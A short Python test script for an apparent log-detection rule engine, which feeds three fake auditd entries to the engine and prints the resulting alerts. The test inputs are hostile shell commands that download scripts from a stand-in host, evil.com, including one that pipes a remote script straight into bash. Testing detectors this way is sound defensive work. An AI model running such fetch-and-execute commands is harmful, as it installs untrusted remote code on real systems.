import json
from app import models
from app.db import SessionLocal
from app.services.rule_engine import RuleEngine

db = SessionLocal()
engine = RuleEngine(db)

def test(msg):
    log = {
        "log_type": "auditd",
        "message": msg,
        "host": "test-host",
        "command_line": msg
    }
    print(f"Testing: {msg}")
    engine.evaluate_raw(log)
    print("Done testing.")

test("curl http://evil.com -o malware.sh")
test("wget http://evil.com/shell.sh")
test("curl -s http://evil.com | bash")

alerts = db.query(models.Alert).order_by(models.Alert.timestamp.desc()).limit(3).all()
for a in alerts:
    print(a.title, a.description)
